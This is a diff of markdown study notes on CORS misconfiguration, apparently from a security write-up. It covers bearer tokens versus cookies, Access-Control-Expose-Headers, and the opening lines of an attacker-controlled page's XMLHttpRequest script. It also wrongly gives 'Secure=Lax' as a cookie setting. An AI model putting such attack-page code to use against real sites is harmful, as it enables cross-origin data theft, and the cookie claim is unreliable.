@@ -8,26 +8,30 @@
 <br>
 <br>
 
-## CORS
+#### CORS
 
 - relaxation for SOP
 
 - API, inter-app-communitcations: example payment gateways
 
+<br>
 
-## Authentication Bearer vs Cookies
+#### Authentication Bearer vs Cookies
 
 - Bearer: prevents CSRF
 
 - Cookies: prevents XSS stealing with `HttpOnly` and `Secure=Lax`
 
+<br>
 
-## Access-Control-Expose-Headers
+#### Access-Control-Expose-Headers
 
 - reading material [here](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Access-Control-Expose-Headers)
 
 - allows a server to indicate which response headers should be made available to scripts running in the browser in response to a cross-origin request.
 
+
+<br>
 
 ## Description
 
@@ -89,7 +93,7 @@ https://whiteoakconsotoapp.com
 - The Attacker controlled website now did the following:
 
 
-```html
+```javascript
 <script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
@@ -125,7 +129,7 @@ https://whiteoakconsotoapp.com
 
 - below is extneded functionality of the Attacker controlled page:
 
-```html
+```js
 <script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
